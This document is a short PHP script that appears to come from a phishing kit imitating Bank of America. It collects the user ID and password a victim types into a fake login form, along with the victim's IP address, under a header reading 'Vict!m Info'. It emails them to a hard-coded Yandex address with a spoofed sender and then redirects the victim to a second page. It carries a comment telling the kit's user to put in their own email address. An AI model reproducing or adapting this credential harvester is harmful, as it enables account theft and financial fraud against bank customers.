<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------BOA Info-----------------------\n";
$message .= "User ID        : ".$_POST['user']."\n";
$message .= "Password       : ".$_POST['psw']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "---------------Created BY Unknown(doit)com-------------\n";
//change ur email here
$send = "mmxx1969@yandex.com";
$subject = "Result from $ip";
$headers = "From: BOA<supertool@mxtoolbox.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }
    header("Location: step2.php");
  

?>